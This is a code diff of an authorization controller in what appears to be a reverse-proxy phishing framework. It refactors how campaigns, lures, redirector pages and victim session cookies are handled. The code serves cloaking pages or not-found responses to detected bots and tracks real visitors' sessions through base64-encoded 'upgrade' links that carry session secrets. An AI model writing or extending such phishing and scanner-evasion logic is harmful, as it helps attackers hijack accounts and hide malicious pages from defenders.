@@ -1,6 +1,7 @@
-import { DIContainer } from '@famir/common'
+import { DIContainer, randomName } from '@famir/common'
 import {
   EnabledFullTargetModel,
+  EnabledLureModel,
   FullCampaignModel,
   FullRedirectorModel,
   SessionModel
@@ -8,7 +9,6 @@ import {
 import {
   HTTP_SERVER_ROUTER,
   HttpServerContext,
-  HttpServerError,
   HttpServerNextFunction,
   HttpServerRouter
 } from '@famir/http-server'
@@ -29,7 +29,7 @@ import {
   type UpgradeSessionUseCase
 } from '../../use-cases/index.js'
 import { BaseController } from '../base/index.js'
-import { LandingRedirectorData, LandingUpgradeData } from './authorize.js'
+import { LandingLureData, LandingUpgradeData } from './authorize.js'
 import { authorizeSchemas } from './authorize.schemas.js'
 
 export const AUTHORIZE_CONTROLLER = Symbol('AuthorizeController')
@@ -82,11 +82,7 @@ export class AuthorizeController extends BaseController {
 
       if (target.isLanding) {
         if (ctx.url.isPath(campaign.landingUpgradePath)) {
-          if (ctx.method.is('GET')) {
-            await this.landingUpgradeSession(ctx, campaign)
-          } else {
-            await this.sendNotFoundPage(ctx, target)
-          }
+          await this.landingUpgradeSession(ctx, campaign, target)
 
           return
         }
@@ -97,13 +93,7 @@ export class AuthorizeController extends BaseController {
         })
 
         if (lureRedirector) {
-          if (ctx.method.is(['GET', 'HEAD'])) {
-            const [lure, redirector] = lureRedirector
-
-            await this.landingRedirectorSession(ctx, campaign, target, redirector)
-          } else {
-            await this.sendNotFoundPage(ctx, target)
-          }
+          await this.landingLureSession(ctx, campaign, target, lureRedirector)
 
           return
         }
@@ -119,80 +109,70 @@ export class AuthorizeController extends BaseController {
 
   protected async landingUpgradeSession(
     ctx: HttpServerContext,
-    campaign: FullCampaignModel
+    campaign: FullCampaignModel,
+    target: EnabledFullTargetModel
   ): Promise<void> {
-    const landingUpgradeData = this.parseLandingUpgradeData(ctx)
+    if (!ctx.method.is('GET')) {
+      await this.sendNotFoundPage(ctx, target)
+
+      return
+    }
+
+    const upgradeData = this.parseLandingUpgradeData(ctx)
+    if (!upgradeData) {
+      await this.sendNotFoundPage(ctx, target)
+
+      return
+    }
 
     if (ctx.isBot) {
-      await this.sendMainRedirect(ctx)
+      await this.sendNotFoundPage(ctx, target)
 
       return
     }
 
-    const sessionCookie = this.lookupSessionCookie(ctx, campaign)
-    if (!sessionCookie) {
-      await this.sendMainRedirect(ctx)
-
-      return
-    }
-
-    if (!this.checkSessionCookie(sessionCookie)) {
-      this.removeSessionCookie(ctx, campaign)
-
-      await this.sendMainRedirect(ctx)
-
-      return
-    }
-
-    const session = await this.authSessionUseCase.execute({
+    const isOkey = await this.upgradeSessionUseCase.execute({
       campaignId: campaign.campaignId,
-      sessionId: sessionCookie
+      lureId: upgradeData.lure_id,
+      sessionId: upgradeData.session_id,
+      secret: upgradeData.secret
     })
 
-    if (!session) {
-      this.removeSessionCookie(ctx, campaign)
-
-      await this.sendMainRedirect(ctx)
+    if (!isOkey) {
+      await this.sendNotFoundPage(ctx, target)
 
       return
     }
 
-    if (session.isLanding) {
-      this.persistSessionCookie(ctx, campaign, session)
-
-      await this.sendMainRedirect(ctx)
-
-      return
-    }
-
-    await this.upgradeSessionUseCase.execute({
-      campaignId: campaign.campaignId,
-      lureId: landingUpgradeData.lure_id,
-      sessionId: session.sessionId,
-      secret: landingUpgradeData.secret
-    })
-
-    this.persistSessionCookie(ctx, campaign, session)
-
-    await this.sendMainRedirect(ctx)
+    await this.sendRedirectTo(ctx, upgradeData.back_url)
   }
 
-  protected async landingRedirectorSession(
+  protected async landingLureSession(
     ctx: HttpServerContext,
     campaign: FullCampaignModel,
     target: EnabledFullTargetModel,
-    redirector: FullRedirectorModel
+    lureRedirector: [EnabledLureModel, FullRedirectorModel]
   ): Promise<void> {
-    const landingRedirectorData = this.parseLandingRedirectorData(ctx)
-
-    if (ctx.isBot) {
-      await this.sendRedirectorPage(ctx, campaign, target, redirector, landingRedirectorData)
+    if (!ctx.method.is(['GET', 'HEAD'])) {
+      await this.sendNotFoundPage(ctx, target)
 
       return
     }
 
-    const sessionCookie = this.lookupSessionCookie(ctx, campaign)
+    const lureData = this.parseLandingLureData(ctx)
+    if (!lureData) {
+      await this.sendNotFoundPage(ctx, target)
 
+      return
+    }
+
+    if (ctx.isBot) {
+      await this.sendRedirectorPage(ctx, campaign, target, lureRedirector, null, lureData)
+
+      return
+    }
+
+    const sessionCookie = this.getSessionCookie(ctx, campaign)
     if (!sessionCookie) {
       const session = await this.createSessionUseCase.execute({
         campaignId: campaign.campaignId
@@ -228,7 +208,7 @@ export class AuthorizeController extends BaseController {
 
     this.persistSessionCookie(ctx, campaign, session)
 
-    await this.sendRedirectorPage(ctx, campaign, target, redirector, landingRedirectorData)
+    await this.sendRedirectorPage(ctx, campaign, target, lureRedirector, session, lureData)
   }
 
   protected async landingAuthSession(
@@ -243,8 +223,7 @@ export class AuthorizeController extends BaseController {
       return
     }
 
-    const sessionCookie = this.lookupSessionCookie(ctx, campaign)
-
+    const sessionCookie = this.getSessionCookie(ctx, campaign)
     if (!sessionCookie) {
       await this.sendCloakingSite(ctx, target)
 
@@ -312,8 +291,7 @@ export class AuthorizeController extends BaseController {
 
     let session: SessionModel | null = null
 
-    const sessionCookie = this.lookupSessionCookie(ctx, campaign)
-
+    const sessionCookie = this.getSessionCookie(ctx, campaign)
     if (sessionCookie && this.checkSessionCookie(sessionCookie)) {
       session = await this.authSessionUseCase.execute({
         campaignId: campaign.campaignId,
@@ -347,7 +325,7 @@ export class AuthorizeController extends BaseController {
     await next()
   }
 
-  private lookupSessionCookie(
+  private getSessionCookie(
     ctx: HttpServerContext,
     campaign: FullCampaignModel
   ): HttpCookie | undefined {
@@ -357,7 +335,7 @@ export class AuthorizeController extends BaseController {
   }
 
   private checkSessionCookie(value: unknown): value is string {
-    return this.validator.guardSchema<string>('reverse-proxy-session-cookie', value)
+    return this.validator.guardSchema<string>('reverse-session-cookie', value)
   }
 
   private persistSessionCookie(
@@ -392,56 +370,41 @@ export class AuthorizeController extends BaseController {
     ctx.responseHeaders.setSetCookies(setCookies)
   }
 
-  private parseLandingUpgradeData(ctx: HttpServerContext): LandingUpgradeData {
+  private parseLandingUpgradeData(ctx: HttpServerContext): LandingUpgradeData | null {
     try {
       const queryString = ctx.url.getQueryString()
       const value = Object.values(queryString)[0]
 
       if (!(value && typeof value === 'string')) {
-        throw new Error(`QueryString value is not a string`)
+        return null
       }
 
       const data: unknown = JSON.parse(Buffer.from(value, 'base64').toString())
 
-      this.validator.assertSchema<LandingUpgradeData>('reverse-proxy-landing-upgrade-data', data)
+      this.validator.assertSchema<LandingUpgradeData>('reverse-landing-upgrade-data', data)
 
       return data
-    } catch (error) {
-      throw new HttpServerError(`Bad request`, {
-        cause: error,
-        context: {
-          reason: `Parse landing upgrade data failed`
-        },
-        code: 'BAD_REQUEST'
-      })
+    } catch {
+      return null
     }
   }
 
-  private parseLandingRedirectorData(ctx: HttpServerContext): LandingRedirectorData {
+  private parseLandingLureData(ctx: HttpServerContext): LandingLureData | null {
     try {
       const queryString = ctx.url.getQueryString()
       const value = Object.values(queryString)[0]
 
       if (!(value && typeof value === 'string')) {
-        throw new Error(`QueryString value is not a string`)
+        return null
       }
 
       const data: unknown = JSON.parse(Buffer.from(value, 'base64').toString())
 
-      this.validator.assertSchema<LandingRedirectorData>(
-        'reverse-proxy-landing-redirector-data',
-        data
-      )
+      this.validator.assertSchema<LandingLureData>('reverse-landing-lure-data', data)
 
       return data
-    } catch (error) {
-      throw new HttpServerError(`Bad request`, {
-        cause: error,
-        context: {
-          reason: `Parse landing redirector data failed`
-        },
-        code: 'BAD_REQUEST'
-      })
+    } catch {
+      return null
     }
   }
 
@@ -460,14 +423,47 @@ export class AuthorizeController extends BaseController {
     ctx: HttpServerContext,
     campaign: FullCampaignModel,
     target: EnabledFullTargetModel,
-    redirector: FullRedirectorModel,
-    landingRedirectorData: LandingRedirectorData
+    lureRedirector: [EnabledLureModel, FullRedirectorModel],
+    session: SessionModel | null,
+    lureData: LandingLureData
   ): Promise<void> {
     if (ctx.method.is(['GET', 'HEAD'])) {
+      const [lure, redirector] = lureRedirector
+
       ctx.status.set(200)
 
-      const text = this.templater.render(redirector.page, landingRedirectorData)
-      ctx.responseBody.setText(text)
+      if (session) {
+        const upgradeData: LandingUpgradeData = {
+          lure_id: lure.lureId,
+          session_id: session.sessionId,
+          secret: session.secret,
+          back_url: lureData['back_url'] ?? '/'
+        }
+
+        const upgradeBlob = Buffer.from(JSON.stringify(upgradeData)).toString('base64')
+
+        const upgradeUrl = [
+          //target.mirrorUrl,
+          campaign.landingUpgradePath,
+          '?',
+          randomName(),
+          '=',
+          upgradeBlob
+        ].join('')
+
+        ctx.responseBody.setText(
+          this.templater.render(redirector.page, {
+            ...lureData,
+            upgrade_url: upgradeUrl
+          })
+        )
+      } else {
+        ctx.responseBody.setText(
+          this.templater.render(redirector.page, {
+            ...lureData
+          })
+        )
+      }
 
       ctx.responseHeaders.merge({
         'Content-Type': 'text/html',
